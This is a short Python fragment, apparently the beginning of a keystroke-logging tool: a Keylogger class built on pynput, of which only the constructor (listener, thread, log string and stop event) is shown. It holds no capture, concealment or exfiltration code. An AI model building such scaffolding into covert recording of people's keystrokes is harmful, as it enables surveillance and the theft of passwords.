from pynput import keyboard
import threading
from typing import Optional


class Keylogger:
    def __init__(self) -> None:
        self._listener: Optional[keyboard.Listener] = None
        self._thread: Optional[threading.Thread] = None
        self.is_listening = False
        self.log = ""
        self._stop_event = threading.Event()

